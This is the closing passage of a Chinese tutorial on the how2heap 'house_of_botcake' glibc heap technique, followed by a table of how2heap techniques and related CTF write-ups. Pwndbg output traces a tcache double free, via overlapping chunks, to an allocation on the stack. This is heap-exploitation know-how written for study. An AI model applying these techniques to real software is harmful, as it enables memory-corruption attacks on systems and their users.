    all: 0x555555559ad0 __ 0x7ffff7fbcca0 (main_arena+96) __ 0x555555559ad0
    smallbins
    empty
    largebins
    empty
因为我们的prev和a是连在一起的chunk,因此此时我们再free prev就会触发和在unsorted bin中与a的合并,也就是
    pwndbg> bins
    tcachebins
    0x110 [  7]: 0x5555555598c0 __ 0x5555555597b0 __ 0x5555555596a0 __ 0x555555559590 __ 0x555555559480 __ 0x555555559370 __ 0x555555559260 __ 0x0
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all: 0x5555555599c0 __ 0x7ffff7fbcca0 (main_arena+96) __ 0x5555555599c0
    smallbins
    empty
    largebins
    empty
    pwndbg> x/10gx 0x5555555599c0
    0x5555555599c0: 0x0000000000000000      0x0000000000000221
    0x5555555599d0: 0x00007ffff7fbcca0      0x00007ffff7fbcca0
    0x5555555599e0: 0x0000000000000000      0x0000000000000000
    0x5555555599f0: 0x0000000000000000      0x0000000000000000
    0x555555559a00: 0x0000000000000000      0x0000000000000000
可以看到,此时被合并后的大chunk仍在unsortedbin 中且大小为0x221
现在让我们从tcache list中取出一个chunk来留下一个位置
    pwndbg> bins
    tcachebins
    0x110 [  6]: 0x5555555597b0 __ 0x5555555596a0 __ 0x555555559590 __ 0x555555559480 __ 0x555555559370 __ 0x555555559260 __ 0x0
现在我们再free一次a,为什么能成功呢?
因为我们的prev和a已经合并了,此时free list上并没有a的信息,因此我们可以再次free一次a
    pwndbg> bins
    tcachebins
    0x110 [  7]: 0x555555559ae0 __ 0x5555555597b0 __ 0x5555555596a0 __ 0x555555559590 __ 0x555555559480 __ 0x555555559370 __ 0x555555559260 __ 0x0
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all: 0x5555555599c0 __ 0x7ffff7fbcca0 (main_arena+96) __ 0x5555555599c0
    smallbins
    empty
    largebins
    empty
可以看到此时我们的a已经被链入free list中,属于tcache
现在我们的a既在tcache中,又在我们的unsorted bin的大chunk中
此时我们malloc b(0x120),系统就会从我们的unsorted bin中切出一块来给他,把剩下的留在unsorted
bin中,也就意味着b会从之前prev的地方开始，并且和a有交集，也就是成功构造了overlapping
    pwndbg> bins
    tcachebins
    0x110 [  7]: 0x555555559ae0 __ 0x5555555597b0 __ 0x5555555596a0 __ 0x555555559590 __ 0x555555559480 __ 0x555555559370 __ 0x555555559260 __ 0x0
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all: 0x555555559af0 __ 0x7ffff7fbcca0 (main_arena+96) __ 0x555555559af0
    smallbins
    empty
    largebins
    empty
现在我们的unsorted bin中的chunk就是从0x555555559af0处开始的了
现在我们通过b来覆写a的fwd指针
我们先来看看我们现在a的结构
    $20 = {
      mchunk_prev_size = 0x0, 
      mchunk_size = 0x111, 
      fd = 0x5555555597b0, 
      bk = 0x555555559010, 
      fd_nextsize = 0x0, 
      bk_nextsize = 0xf1
    }
之后是覆写后a的结构
    $21 = {
      mchunk_prev_size = 0x0,
      mchunk_size = 0x111,
      fd = 0x7fffffffe570,
      bk = 0x555555559010,
      fd_nextsize = 0x0,
      bk_nextsize = 0xf1
    }
可以看到我们a的fd指针已经被更改了,此时我们的tcache链
    pwndbg> bins
    tcachebins
    0x110 [  7]: 0x555555559ae0 __ 0x7fffffffe570 __ 0xc2
现在就可以看到结果了,我们先malloc一块出来
    pwndbg> bins
    tcachebins
    0x110 [  6]: 0x7fffffffe570 __ 0xc2
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all: 0x555555559af0 __ 0x7ffff7fbcca0 (main_arena+96) __ 0x555555559af0
    smallbins
    empty
    largebins
    empty
现在就只剩下我们想分配的内存了,下面我们把他分配出来
    pwndbg> p/x c
    $22 = 0x7fffffffe570
成功
###  总结
本例即是通过构造一个chunk_overlapping来辅助我们double free一个tcache chunk，从而得到任意地址分配的效果
首先程序先在栈上声明了一个变量
之后申请了7个大小为0x100的chunks来为后面填满tcache来做准备
然后申请了3个chunk ,prev(0x100),a(0x100)还有用于防止后面我们释放a时a和top chunk合并的一个chunk(0x10)
到此准备工作就结束了
下面程序free掉了之前我们申请的那7个chunk来填满我们的tcache
之后程序free掉了a，a被放入了unsorted bin中
此时我们在free prev，由于a,prev相邻，因此二者合并成了一个大chunk，同样被放进了unsorted bin中
此时free list上就没有了a的信息
现在程序从tcache中取出一个chunk,tcache中就有了一个空位，我们再次free a,就会把我们的a放到tcache中了
此时，我们的a既在tcache中，又在unsortedbin的大chunk中
也就是完成了一个double free
之后程序malloc了b(0x120),由于unsortedbin中的chunk大小大于0x120,因此做了一个切割，并把剩下的部分留在unsorted
bin中
此时的b是从之前prev的位置开始的，因此我们通过覆写b来将我们a的fwd指针指向栈上
此时，我们再申请两次就可以分配到栈上的地址了
## 完结
本系列到此就结束了，但堆的利用方式远远不止这些技巧，但万变不离其宗，希望看我文章的同学在不懂的地方也动手调试一下
本文对堆的很多利用方式也给了我们一些启示，在寻找一些新的利用方式时，也就是审源码时，只要是没有被检查的地方都有可能是我们可以利用的地方
也十分感谢shellphish团队的开源精神！
再次贴出项目地址: 
最后也在这里贴出how2heap对于本项目的一个相关总结吧，说来也巧，在我写到这的时候正好遇到该项目把house_of_botcake加到了readme中，这里我也加上了
文件 | 技术 | Glibc版本 | 对应的ctf题目  
---|---|---|---  
[first_fit.c](first_fit.c) | 演示了glibc的first fit原则. |  |  
[calc_tcache_idx.c](calc_tcache_idx.c) | 演示如何计算tcache索引的方法. |  |  
[fastbin_dup.c](fastbin_dup.c) | 通过控制fast bin free list
来欺骗malloc,从而获得一个已经分配过的堆指针 |  |  
[fastbin_dup_into_stack.c](glibc_2.25/fastbin_dup_into_stack.c) | 通过构造fast bin
free list来欺骗malloc,从而获得一个指向任意地址的堆指针 | latest |  [9447-search-engine](https://github.com/ctfs/write-ups-2015/tree/master/9447-ctf-2015/exploitation/search-engine), [0ctf
2017-babyheap](http://uaf.io/exploitation/2017/03/19/0ctf-Quals-2017-BabyHeap2017.html)  
[fastbin_dup_consolidate.c](glibc_2.25/fastbin_dup_consolidate.c) |
通过把一个指针既放到fastbin freelist中又放到unsorted bin中来欺骗malloc,从而获得一个已经分配了的堆指针 | latest
| [Hitcon 2016
SleepyHolder](https://github.com/mehQQ/public_writeup/tree/master/hitcon2016/SleepyHolder)  
[unsafe_unlink.c](glibc_2.26/unsafe_unlink.c) | 利用free在一个corrupted
chunk上获得任意写的能力. |  2.25 |  
[tcache_house_of_spirit.c](glibc_2.26/tcache_house_of_spirit.c) | free一个Fake
chunk来让malloc返回一个指向几乎任意地址的指针 | > 2.25 |  
[house_of_botcake.c](glibc_2.26/house_of_botcake.c) | bypass tcache的 double
free的检查 | >2.25